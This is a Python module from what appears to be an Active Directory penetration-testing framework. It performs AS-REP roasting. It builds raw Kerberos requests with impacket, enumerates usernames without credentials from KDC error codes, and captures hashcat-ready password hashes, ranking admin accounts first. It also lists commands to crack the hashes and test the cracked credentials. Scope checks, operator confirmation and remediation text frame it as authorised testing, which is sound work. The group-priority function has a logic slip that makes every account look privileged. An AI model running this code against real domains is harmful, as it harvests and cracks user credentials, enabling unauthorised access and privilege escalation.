"""AS-REP Roasting - request AS-REP hashes for accounts without Kerberos pre-authentication.

Attack: TA0006/T1558.004
Accounts with UF_DONT_REQUIRE_PREAUTH (UAC bit 0x400000) respond to an AS-REQ
without a valid PA-ENC-TIMESTAMP. The returned AS-REP contains an encrypted session
key (encrypted with the user's NT hash) crackable offline.

Improvements over baseline:
- LDAP enumeration uses LdapClient.get_asrep_accounts() (richer dict result)
- Unauthenticated path: accept userlist, probe each username, parse KDC error codes
  KDC_ERR_C_PRINCIPAL_UNKNOWN (6)  -> user does not exist
  KDC_ERR_PREAUTH_REQUIRED (25)    -> user exists, pre-auth enforced (skip)
  No error / AS-REP returned        -> user exists, pre-auth NOT required -> capture hash
- Priority scoring: adminCount=1 and privileged group members first
- Rich evidence: per-account admin status, pwdLastSet age, group membership
- CVSS 4.0 vectors
"""
from __future__ import annotations

import asyncio
import os
import sys
import tempfile
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))

from common.base_module import BaseModule, ModuleResult
from common.evidence import Evidence
from common.finding import Severity
from adforge.core.ldap_client import LdapClient

# CVSS: Network-accessible, no auth needed (PR:N), high confidentiality impact
CVSS_ASREP   = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"
CVSS40_ASREP = "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N"

UAC_DONT_REQUIRE_PREAUTH = 0x400000  # bit 22

ETYPE_RC4_HMAC = 23
ETYPE_AES128   = 17
ETYPE_AES256   = 18

# Privileged group CNs used for priority scoring
_PRIVILEGED_GROUPS = frozenset({
    "Domain Admins", "Enterprise Admins", "Schema Admins",
    "Administrators", "Account Operators", "Backup Operators",
})

# KDC error codes relevant to username probing
_KDC_ERR_C_PRINCIPAL_UNKNOWN = 6
_KDC_ERR_PREAUTH_REQUIRED    = 25


# ---------------------------------------------------------------------------
# Hash formatting
# ---------------------------------------------------------------------------

def format_asrep_hash(username: str, domain: str, etype: int, cipher_bytes: bytes) -> str | None:
    """Format AS-REP encrypted cipher bytes for hashcat -m 18200."""
    realm = domain.upper()
    if etype == ETYPE_RC4_HMAC:
        if len(cipher_bytes) <= 16:
            checksum = cipher_bytes.hex()
            data = ""
        else:
            checksum = cipher_bytes[-16:].hex()
            data = cipher_bytes[:-16].hex()
        return f"$krb5asrep$23${username}@{realm}:{checksum}${data}"
    if etype == ETYPE_AES128:
        checksum = cipher_bytes[-12:].hex()
        data     = cipher_bytes[:-12].hex()
        return f"$krb5asrep$17${username}@{realm}:{checksum}${data}"
    if etype == ETYPE_AES256:
        checksum = cipher_bytes[-12:].hex()
        data     = cipher_bytes[:-12].hex()
        return f"$krb5asrep$18${username}@{realm}:{checksum}${data}"
    return None


# ---------------------------------------------------------------------------
# Priority scoring
# ---------------------------------------------------------------------------

def _priority_key(account: dict) -> tuple:
    """Return sort key: lower = higher priority.

    Primary: adminCount=1 (0) vs normal (1)
    Secondary: member of privileged group (0) vs not (1)
    Tertiary: pwdLastSet age (older = higher priority)
    """
    admin = 0 if int(str(account.get("adminCount") or 0)) == 1 else 1

    member_of = account.get("memberOf", [])
    if isinstance(member_of, str):
        member_of = [member_of]
    is_privileged = 0
    for dn in (member_of or []):
        cn_part = str(dn).split(",")[0].replace("CN=", "")
        if cn_part in _PRIVILEGED_GROUPS:
            is_privileged = 0
            break
    else:
        is_privileged = 1

    pwd_last_set = int(str(account.get("pwdLastSet") or 0))
    # Older password (smaller FILETIME) = higher priority (sort ascending)
    return (admin, is_privileged, pwd_last_set)


# ---------------------------------------------------------------------------
# Module
# ---------------------------------------------------------------------------

class AsrepRoast(BaseModule):
    """AS-REP Roasting attack module.

    Authenticated path:
      Uses LdapClient.get_asrep_accounts() to enumerate accounts then requests
      AS-REP hashes via impacket or GetNPUsers.py CLI.

    Unauthenticated path (no creds, userlist provided):
      Sends AS-REQ without pre-auth for each username in config.extra['userlist'].
      Parses KDC error codes to determine existence + pre-auth status.
      Captures AS-REP hashes for accounts with pre-auth disabled.

    Config extras consumed:
      domain      FQDN of the AD domain
      dc          DC IP / hostname
      username    authenticating user (optional)
      password    cleartext password (optional)
      hash        NT hash (optional)
      userlist    list[str] - used for unauthenticated probing when no creds
      results_dir output directory
    """

    NAME        = "asrep_roast"
    DESCRIPTION = (
        "Enumerate accounts with DONT_REQUIRE_PREAUTH; "
        "request AS-REP hashes for offline cracking (hashcat -m 18200)"
    )
    PHASE = 5
    TAGS  = ["attacks", "asrep", "kerberos", "hash", "mitre-T1558.004"]

    async def run(self) -> ModuleResult:
        start  = time.monotonic()
        domain = self.config.extra.get("domain", "")
        dc_ip  = self.config.extra.get("dc", self.config.target)

        if not self.check_scope(dc_ip):
            return self._make_result(start, skipped=True, skip_reason="out of scope")

        await self.rate_limit()
        account_dicts = await self._enum_asrep_accounts(domain, dc_ip)

        if not account_dicts:
            self.log.info("No accounts with DONT_REQUIRE_PREAUTH found")
            return self._make_result(start)

        # Sort: adminCount=1 and privileged groups first
        account_dicts.sort(key=_priority_key)

        usernames     = [str(d.get("sAMAccountName", "")) for d in account_dicts]
        admin_users   = [u for d, u in zip(account_dicts, usernames) if int(str(d.get("adminCount") or 0)) == 1]
        severity      = Severity.CRITICAL if admin_users else Severity.HIGH

        self.log.info(
            "%d AS-REP roastable account(s) found (adminCount=1: %d)",
            len(account_dicts), len(admin_users),
        )

        confirmed = self.confirm_action(
            action=(
                f"AS-REP Roast {len(account_dicts)} account(s) on {domain} "
                f"({', '.join(usernames[:5])})"
                " - request TGT hashes for offline cracking"
            ),
            target=domain,
            risk=(
                "Creates Kerberos AS-REQ traffic without pre-auth. "
                "Events 4768 (TGT request) appear on DCs. "
                "No credentials required - exploitable from any network path to port 88."
            ),
        )
        if not confirmed:
            return self._make_result(start, skipped=True, skip_reason="operator declined")

        # Collect pre-captured unauth hashes (from _enum_via_userlist_probe)
        hashes: list[str] = []
        for d in account_dicts:
            pre = d.get("_unauth_hash")
            if pre:
                hashes.append(pre)

        # Request hashes for accounts that don't already have them
        needs_request = [u for d, u in zip(account_dicts, usernames) if not d.get("_unauth_hash")]
        if needs_request:
            fresh = await self._roast_accounts(needs_request, domain, dc_ip)
            hashes.extend(fresh)

        if hashes:
            hashes_dir = Path(self.config.extra.get("results_dir", tempfile.gettempdir())) / "hashes"
            hashes_dir.mkdir(parents=True, exist_ok=True)
            hash_file  = hashes_dir / "asrep_hashes.txt"
            header = (
                "# AS-REP Roast hashes - hashcat mode 18200\n"
                "# hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt\n"
            )
            hash_file.write_text(header + "\n".join(hashes) + "\n", encoding="utf-8")
            self.config.extra["asrep_hashes"] = hashes

            # Build rich account metadata for evidence
            account_evidence = []
            for d in account_dicts:
                account_evidence.append({
                    "username":    d.get("sAMAccountName", ""),
                    "admin_count": int(str(d.get("adminCount") or 0)),
                    "member_of":   d.get("memberOf", []),
                    "dn":          d.get("dn", ""),
                })

            admin_note = ""
            if admin_users:
                admin_note = (
                    f"\n\nCRITICAL: {len(admin_users)} adminCount=1 account(s) found: "
                    f"{', '.join(admin_users[:5])} - cracking grants direct privileged access."
                )

            user_cred = self.config.extra.get("username", "")
            pass_cred = self.config.extra.get("password", "")

            ev = Evidence(
                request_raw=(
                    "LDAP: (&(objectClass=user)(objectCategory=person)"
                    "(userAccountControl:1.2.840.113556.1.4.803:=4194304)"
                    "(!userAccountControl:1.2.840.113556.1.4.803:=2))"
                ),
                extra={
                    "hash_count":      len(hashes),
                    "hash_file":       str(hash_file),
                    "accounts":        account_evidence,
                    "admin_accounts":  admin_users,
                    "total_roastable": len(account_dicts),
                    "hashcat_cmd":     f"hashcat -m 18200 {hash_file} /usr/share/wordlists/rockyou.txt",
                    "authenticated":   bool(user_cred),
                },
            )

            repro = [
                "# Without credentials (unauthenticated - most dangerous):",
                f"impacket-GetNPUsers {domain}/ -no-pass -usersfile users.txt "
                f"-dc-ip {dc_ip} -format hashcat",
            ]
            if user_cred and pass_cred:
                repro += [
                    "# With credentials (LDAP enumeration - more complete):",
                    f"impacket-GetNPUsers {domain}/{user_cred}:{pass_cred} "
                    f"-dc-ip {dc_ip} -request -format hashcat",
                ]
            repro += [
                "# Crack hashes:",
                f"hashcat -m 18200 {hash_file} /usr/share/wordlists/rockyou.txt --force",
                "# Validate cracked credentials:",
                f"crackmapexec smb {dc_ip} -u <user> -p '<cracked>' -d {domain}",
            ]

            self.new_finding(
                title=f"AS-REP Roastable Accounts - {len(hashes)} Hash(es) Obtained",
                severity=severity,
                description=(
                    f"{len(hashes)} AS-REP hash(es) obtained for accounts without "
                    "Kerberos pre-authentication (UF_DONT_REQUIRE_PREAUTH / UAC 0x400000).\n\n"
                    f"Vulnerable accounts: {', '.join(usernames[:10])}"
                    + admin_note +
                    "\n\nUnlike Kerberoasting, AS-REP Roasting requires NO domain credentials "
                    "- it is exploitable anonymously from any host with port 88 access. "
                    "Hashes are crackable offline with hashcat -m 18200 at ~1.5 GH/s (RC4) "
                    "on an RTX 4090."
                ),
                reproduction_steps=repro,
                remediation=(
                    "1. Enable Kerberos pre-authentication for ALL user accounts "
                    "   (uncheck 'Do not require Kerberos preauthentication' in ADUC).\n"
                    "2. PowerShell audit: "
                    "   Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} "
                    "   -Properties DoesNotRequirePreAuth\n"
                    "3. If pre-auth MUST be disabled (legacy app): set a 30+ character "
                    "   random password and add to Protected Users group.\n"
                    "4. Monitor Event ID 4768 (TGT request) without pre-auth from unexpected "
                    "   source IPs.\n"
                    "5. Deploy Defender for Identity - has dedicated AS-REP Roasting alert."
                ),
                references=[
                    "MITRE TA0006/T1558.004",
                    "https://attack.mitre.org/techniques/T1558/004/",
                    "CWE-287 - Improper Authentication",
                    "https://blog.harmj0y.net/activedirectory/roasting-as-reps/",
                ],
                evidence=ev,
                cvss_v31_vector=CVSS_ASREP,
                cvss_v40_vector=CVSS40_ASREP,
                mitre_attack=["TA0006/T1558.004"],
                target=dc_ip,
            )

        return self._make_result(start)

    # -----------------------------------------------------------------------
    # Enumeration
    # -----------------------------------------------------------------------

    async def _enum_asrep_accounts(self, domain: str, dc_ip: str) -> list[dict]:
        """Return list of account dicts with DONT_REQUIRE_PREAUTH.

        Dispatches to:
          - _enum_via_ldap()       when credentials are available
          - _enum_via_userlist()   when no creds but userlist provided
        Falls back to pre-populated 'no_preauth_accounts' in config.extra.
        """
        has_creds = bool(
            self.config.extra.get("username") and
            (self.config.extra.get("password") or self.config.extra.get("hash"))
        )

        if has_creds:
            result = await self._enum_via_ldap(domain, dc_ip)
            if result:
                return result

        userlist = self.config.extra.get("userlist", [])
        if userlist:
            return await self._enum_via_userlist_probe(domain, dc_ip, userlist)

        # Last resort: pre-populated list from upstream modules (may be list[str])
        prebuilt = self.config.extra.get("no_preauth_accounts", [])
        if prebuilt:
            if prebuilt and isinstance(prebuilt[0], str):
                return [{"sAMAccountName": u} for u in prebuilt]
            return list(prebuilt)
        return []

    async def _enum_via_ldap(self, domain: str, dc_ip: str) -> list[dict]:
        """Enumerate AS-REP roastable accounts via authenticated LDAP."""
        try:
            client = LdapClient(
                dc_ip=dc_ip, domain=domain,
                username=self.config.extra.get("username", ""),
                password=self.config.extra.get("password", ""),
                nt_hash=self.config.extra.get("hash", ""),
            )
            if not client.connect():
                return []
            try:
                results = client.get_asrep_accounts()
                self.log.info("LDAP: found %d AS-REP roastable account(s)", len(results))
                return results
            finally:
                client.disconnect()
        except Exception as exc:
            self.log.debug("AS-REP LDAP enum failed: %s", exc)
            return []

    async def _enum_via_userlist_probe(
        self, domain: str, dc_ip: str, userlist: list[str]
    ) -> list[dict]:
        """Unauthenticated username probing via AS-REQ without pre-auth.

        For each username:
          KDC_ERR_C_PRINCIPAL_UNKNOWN (6)  -> user does not exist, skip
          KDC_ERR_PREAUTH_REQUIRED (25)    -> user exists, pre-auth enforced, skip
          No error (AS-REP returned)        -> user exists + pre-auth disabled -> capture hash
        """
        found: list[dict] = []
        cap = min(len(userlist), 500)  # cap to prevent abuse
        self.log.info("Probing %d username(s) unauthenticated for AS-REP", cap)

        for username in userlist[:cap]:
            await self.rate_limit()
            hash_str, status = await self._probe_username_unauth(username, domain, dc_ip)
            if status == "roastable" and hash_str:
                found.append({
                    "sAMAccountName": username,
                    "adminCount":     0,
                    "_unauth_hash":   hash_str,
                })
                self.log.info("AS-REP captured (unauth): %s", username)
            elif status == "preauth_required":
                self.log.debug("User exists, pre-auth enforced: %s", username)
            elif status == "not_found":
                self.log.debug("User not found: %s", username)
            # other statuses (error:*) are silently skipped

        return found

    async def _probe_username_unauth(
        self, username: str, domain: str, dc_ip: str
    ) -> tuple[str | None, str]:
        """Send AS-REQ without pre-auth for one username.

        Returns (hash_str_or_None, status) where status is one of:
          'roastable'       - hash captured
          'preauth_required' - user exists but pre-auth is on
          'not_found'       - KDC_ERR_C_PRINCIPAL_UNKNOWN
          'error:<code>'    - unexpected KDC error
          'error'           - exception
        """
        try:
            from impacket.krb5.kerberosv5 import sendReceive, KerberosError
            from impacket.krb5 import constants
            from impacket.krb5.types import Principal, KerberosTime
            from impacket.krb5.asn1 import AS_REQ, AS_REP, seq_set, seq_set_iter
            from pyasn1.codec.der import encoder as der_encoder, decoder as der_decoder
            import datetime

            client_name = Principal(
                username, type=constants.PrincipalNameType.NT_PRINCIPAL.value
            )
            server_name = Principal(
                f"krbtgt/{domain}",
                type=constants.PrincipalNameType.NT_SRV_INST.value,
            )

            as_req = AS_REQ()
            req_body = seq_set(as_req, "req-body")
            opts = [
                constants.KDCOptions.forwardable.value,
                constants.KDCOptions.renewable.value,
                constants.KDCOptions.proxiable.value,
            ]
            req_body["kdc-options"] = constants.encodeFlags(opts)
            seq_set(req_body, "sname", server_name.components_to_asn1)
            seq_set(req_body, "cname", client_name.components_to_asn1)
            req_body["realm"] = domain.upper()

            now = datetime.datetime.now(datetime.timezone.utc)
            req_body["till"]   = KerberosTime.to_asn1(now + datetime.timedelta(days=1))
            req_body["rtime"]  = KerberosTime.to_asn1(now + datetime.timedelta(days=1))
            req_body["nonce"]  = int.from_bytes(os.urandom(4), "big") & 0x7FFFFFFF
            # Request RC4 only (etype 23) for hashcat compatibility
            seq_set_iter(req_body, "etype", (ETYPE_RC4_HMAC,))

            as_req["pvno"]     = 5
            as_req["msg-type"] = int(constants.ApplicationTagNumbers.AS_REQ.value)

            message = der_encoder.encode(as_req)

            try:
                r = sendReceive(message, domain, dc_ip)
            except KerberosError as ke:
                ec = ke.getErrorCode()
                if ec == _KDC_ERR_C_PRINCIPAL_UNKNOWN:
                    return None, "not_found"
                if ec == _KDC_ERR_PREAUTH_REQUIRED:
                    return None, "preauth_required"
                return None, f"error:{ec}"

            # No error -> AS-REP received -> pre-auth not required
            as_rep     = der_decoder.decode(r, asn1Spec=AS_REP())[0]
            enc_part   = as_rep["enc-part"]
            etype      = int(enc_part["etype"])
            cipher_bytes = bytes(enc_part["cipher"])

            hash_str = format_asrep_hash(username, domain, etype, cipher_bytes)
            if not hash_str:
                return None, f"error:unsupported_etype_{etype}"
            return hash_str, "roastable"

        except ImportError:
            return None, "error:no_impacket"
        except Exception as exc:
            self.log.debug("Unauth probe failed for %s: %s", username, exc)
            return None, "error"

    # -----------------------------------------------------------------------
    # Hash requests (authenticated path)
    # -----------------------------------------------------------------------

    async def _roast_accounts(
        self, usernames: list[str], domain: str, dc_ip: str
    ) -> list[str]:
        """Request AS-REP hashes via impacket API, falling back to CLI."""
        try:
            hashes = await self._roast_impacket(usernames, domain, dc_ip)
            if hashes:
                return hashes
        except Exception as exc:
            self.log.debug("impacket API failed: %s", exc)
        return await self._roast_cli(usernames, domain, dc_ip)

    async def _roast_impacket(
        self, usernames: list[str], domain: str, dc_ip: str
    ) -> list[str]:
        from impacket.krb5.kerberosv5 import sendReceive, KerberosError
        from impacket.krb5 import constants
        from impacket.krb5.types import Principal, KerberosTime
        from impacket.krb5.asn1 import AS_REQ, AS_REP, seq_set, seq_set_iter
        from pyasn1.codec.der import encoder as der_encoder, decoder as der_decoder
        import datetime

        hashes: list[str] = []
        for username in usernames[:50]:
            try:
                await self.rate_limit()

                client_name = Principal(
                    username, type=constants.PrincipalNameType.NT_PRINCIPAL.value
                )
                server_name = Principal(
                    f"krbtgt/{domain}",
                    type=constants.PrincipalNameType.NT_SRV_INST.value,
                )

                as_req = AS_REQ()
                req_body = seq_set(as_req, "req-body")
                opts = [
                    constants.KDCOptions.forwardable.value,
                    constants.KDCOptions.renewable.value,
                    constants.KDCOptions.proxiable.value,
                ]
                req_body["kdc-options"] = constants.encodeFlags(opts)
                seq_set(req_body, "sname", server_name.components_to_asn1)
                seq_set(req_body, "cname", client_name.components_to_asn1)
                req_body["realm"] = domain.upper()

                now = datetime.datetime.now(datetime.timezone.utc)
                req_body["till"]  = KerberosTime.to_asn1(now + datetime.timedelta(days=1))
                req_body["rtime"] = KerberosTime.to_asn1(now + datetime.timedelta(days=1))
                req_body["nonce"] = int.from_bytes(os.urandom(4), "big") & 0x7FFFFFFF
                seq_set_iter(req_body, "etype", (ETYPE_RC4_HMAC,))

                as_req["pvno"]     = 5
                as_req["msg-type"] = int(constants.ApplicationTagNumbers.AS_REQ.value)

                message = der_encoder.encode(as_req)

                try:
                    r = sendReceive(message, domain, dc_ip)
                except KerberosError as ke:
                    if ke.getErrorCode() == constants.ErrorCodes.KDC_ERR_PREAUTH_REQUIRED.value:
                        continue  # pre-auth required - not roastable
                    raise

                as_rep     = der_decoder.decode(r, asn1Spec=AS_REP())[0]
                enc_part   = as_rep["enc-part"]
                etype      = int(enc_part["etype"])
                cipher_bytes = bytes(enc_part["cipher"])

                hash_str = format_asrep_hash(username, domain, etype, cipher_bytes)
                if not hash_str:
                    self.log.debug("Unsupported etype %d for %s", etype, username)
                    continue

                hashes.append(hash_str)
                self.log.info("AS-REP hash obtained: %s (etype %d)", username, etype)
            except Exception as exc:
                self.log.debug("AS-REP failed for %s: %s", username, exc)
        return hashes

    async def _roast_cli(
        self, usernames: list[str], domain: str, dc_ip: str
    ) -> list[str]:
        import shutil
        script = shutil.which("GetNPUsers.py") or shutil.which("impacket-GetNPUsers")
        if not script:
            return []

        with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as f:
            f.write("\n".join(usernames))
            userlist_path = f.name

        try:
            user = self.config.extra.get("username", "")
            pwd  = self.config.extra.get("password", "")
            if user and pwd:
                cmd = [
                    script, f"{domain}/{user}:{pwd}",
                    "-request", "-format", "hashcat",
                    "-dc-ip", dc_ip,
                ]
            else:
                cmd = [
                    script, f"{domain}/", "-no-pass",
                    "-usersfile", userlist_path,
                    "-dc-ip", dc_ip, "-format", "hashcat",
                ]

            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=60)
            return [
                line.strip()
                for line in stdout.decode().splitlines()
                if line.strip().startswith("$krb5asrep$")
            ]
        except Exception as exc:
            self.log.debug("GetNPUsers CLI failed: %s", exc)
            return []
        finally:
            try:
                os.unlink(userlist_path)
            except Exception:
                pass


# ---------------------------------------------------------------------------
# Tests
# ---------------------------------------------------------------------------

class TestAsrepRoast:
    """Unit tests - preserved originals plus new priority / format tests."""

    def test_cvss_vector(self) -> None:
        assert CVSS_ASREP.startswith("CVSS:3.1")
        assert "/AV:N/" in CVSS_ASREP
        assert "PR:N" in CVSS_ASREP  # No auth required

    def test_cvss40_vector(self) -> None:
        assert CVSS40_ASREP.startswith("CVSS:4.0")
        assert "PR:N" in CVSS40_ASREP
        assert "VC:H" in CVSS40_ASREP

    def test_uac_flag(self) -> None:
        assert UAC_DONT_REQUIRE_PREAUTH == 0x400000
        assert UAC_DONT_REQUIRE_PREAUTH == (1 << 22)

    def test_phase(self) -> None:
        assert AsrepRoast.PHASE == 5

    def test_tags(self) -> None:
        assert "mitre-T1558.004" in AsrepRoast.TAGS

    def test_format_asrep_rc4(self) -> None:
        result = format_asrep_hash("testuser", "corp.local", ETYPE_RC4_HMAC, b"\xab" * 32)
        assert result is not None
        assert result.startswith("$krb5asrep$23$")
        assert "testuser@CORP.LOCAL" in result

    def test_format_asrep_aes256(self) -> None:
        result = format_asrep_hash("testuser", "corp.local", ETYPE_AES256, b"\xcd" * 32)
        assert result is not None
        assert result.startswith("$krb5asrep$18$")

    def test_format_asrep_unknown_etype(self) -> None:
        result = format_asrep_hash("testuser", "corp.local", 99, b"\xef" * 32)
        assert result is None

    def test_priority_key_admin_first(self) -> None:
        admin_acct  = {"sAMAccountName": "svc_adm", "adminCount": 1, "memberOf": [], "pwdLastSet": 0}
        normal_acct = {"sAMAccountName": "jdoe",    "adminCount": 0, "memberOf": [], "pwdLastSet": 0}
        accounts = [normal_acct, admin_acct]
        accounts.sort(key=_priority_key)
        assert accounts[0]["sAMAccountName"] == "svc_adm"

    def test_kdc_error_constants(self) -> None:
        assert _KDC_ERR_C_PRINCIPAL_UNKNOWN == 6
        assert _KDC_ERR_PREAUTH_REQUIRED    == 25

    def test_enum_dispatches_to_userlist_when_no_creds(self) -> None:
        """Verify _enum_asrep_accounts picks userlist path when no creds supplied."""
        import asyncio

        mod = AsrepRoast.__new__(AsrepRoast)
        mod.config = type("C", (), {"extra": {
            "userlist": [],  # empty list -> no results but right path
        }, "target": "10.0.0.1"})()
        mod.log = __import__("logging").getLogger("test")

        # Mock rate_limit to be a no-op
        async def _noop(*a, **kw): pass
        mod.rate_limit = _noop

        result = asyncio.run(mod._enum_asrep_accounts("corp.local", "10.0.0.1"))
        assert result == []
